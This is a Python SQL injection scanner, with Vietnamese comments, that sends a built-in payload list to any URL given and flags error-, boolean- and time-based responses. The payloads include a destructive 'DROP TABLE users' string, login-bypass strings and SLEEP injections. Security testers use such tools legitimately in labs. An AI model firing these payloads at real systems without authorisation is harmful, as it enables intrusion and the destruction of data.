# sqli_tester.py
#!/usr/bin/env python3
import requests
import argparse
import time
from urllib.parse import quote_plus

# danh sách payloads (cơ bản, có thể mở rộng)
PAYLOADS = [
    # Error-based / syntax
    "'",
    "\"",
    "')",
    "')--",
    "\"'--",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "' OR 1=1 -- ",
    "\" OR \"\" = \"",
    "'; DROP TABLE users; --",
    # Boolean-based (test true/false variants appended in test logic)
    "' OR 1=1 -- ",
    "' OR 1=2 -- ",
    # Time-based (if target supports sleep functions; adjust for DB)
    "'; SELECT sleep(5); --",
    "' OR SLEEP(5)--",
    # comment injections
    "admin' --",
    "admin' #",
]

# một số signature lỗi SQL phổ biến để detect
SQL_ERROR_SIGS = [
    "you have an error in your sql syntax", "sql syntax",
    "warning: mysql", "unclosed quotation mark after the character string",
    "quoted string not properly terminated", "sqlite3.OperationalError", "sqlite3.DatabaseError",
    "pg_query():", "psql:", "syntax error at or near",
    "ORA-", "SQLSTATE", "Microsoft OLE DB Provider for SQL Server", "ODBC SQL Server Driver"
]

# user-agent mặc định
HEADERS = {
    "User-Agent": "SQLi-Tester/1.0"
}

def send_payload(url_template, payload, timeout=8):
    url = url_template.replace("INJECT_HERE", quote_plus(payload))
    try:
        r = requests.get(url, headers=HEADERS, timeout=timeout, allow_redirects=True)
        return r.status_code, r.text, len(r.content)
    except requests.exceptions.RequestException as e:
        return None, f"REQUEST-ERROR: {e}", 0

def find_sql_error(content):
    low = content.lower()
    for sig in SQL_ERROR_SIGS:
        if sig in low:
            return sig
    return None

def main():
    parser = argparse.ArgumentParser(description="Simple SQL Injection payload tester")
    parser.add_argument("-u", "--url", required=True,
                        help='Target URL with INJECT_HERE placeholder, e.g. "http://127.0.0.1:5000/search?q=INJECT_HERE"')
    parser.add_argument("-t", "--timeout", type=int, default=6, help="Request timeout seconds")
    parser.add_argument("--no-boolean", action="store_true", help="Skip boolean difference checks")
    args = parser.parse_args()

    url_template = args.url
    print(f"[+] Target: {url_template}")

    # baseline request with benign value
    baseline_payload = "normalvalue"
    st, body, length = send_payload(url_template, baseline_payload, timeout=args.timeout)
    if st is None:
        print(f"[-] Could not reach target: {body}")
        return
    print(f"[i] Baseline status: {st}, length: {length}")

    for p in PAYLOADS:
        print("\n---")
        print(f"[>] Testing payload: {p}")
        st_p, body_p, len_p = send_payload(url_template, p, timeout=args.timeout)
        if st_p is None:
            print(f"  [!] Request error: {body_p}")
            continue

        print(f"  status: {st_p}, length: {len_p}")
        # check SQL error signatures
        sig = find_sql_error(body_p)
        if sig:
            print(f"  [!!] SQL error signature detected: '{sig}'")
            print("  Verdict: POTENTIAL SQLi (error-based)")
            continue

        # status code change
        if st_p != st:
            print("  [!] HTTP status code changed compared to baseline -> possible error/exception")
            print("  Verdict: POTENTIAL SQLi or server error")
            continue

        # content length difference big enough?
        if abs(len_p - length) > max(20, int(length * 0.1)):
            print(f"  [!] Content length changed significantly (baseline={length} now={len_p})")
            print("  Might be injection affecting output (boolean OR error-based)")
            # continue to boolean check below

        # boolean-based differential test (unless disabled)
        if not args.no_boolean:
            # create true/false variants: try to append an always-true and always-false condition if possible
            true_payload = p + " OR 1=1"
            false_payload = p + " OR 1=2"
            st_t, body_t, len_t = send_payload(url_template, true_payload, timeout=args.timeout)
            st_f, body_f, len_f = send_payload(url_template, false_payload, timeout=args.timeout)
            if st_t is None or st_f is None:
                print("  [!] Could not perform boolean test (request error)")
                continue
            if len_t != len_f or st_t != st_f or body_t != body_f:
                print("  [!!] Boolean difference detected between true/false payloads.")
                print(f"    true len={len_t}, false len={len_f}, baseline len={length}")
                print("  Verdict: POTENTIAL SQLi (boolean-based)")
                continue

        # time-based detection (simple): send payload that includes sleep and measure time difference
        # only run quick time test for payloads that mention sleep
        if "sleep" in p.lower():
            start = time.time()
            st_s, body_s, len_s = send_payload(url_template, p, timeout=args.timeout + 6)
            elapsed = time.time() - start
            print(f"  time elapsed: {elapsed:.2f}s")
            if elapsed > 4.0:
                print("  [!!] Time-based injection likely (server delayed)")
                print("  Verdict: POTENTIAL SQLi (time-based)")
                continue

        # if reached here, no strong sign
        print("  [ ] No clear SQL error or differential detected for this payload.")

    print("\nFinished testing. Reminder: results are heuristic; verify manually in lab.")

if __name__ == "__main__":
    main()
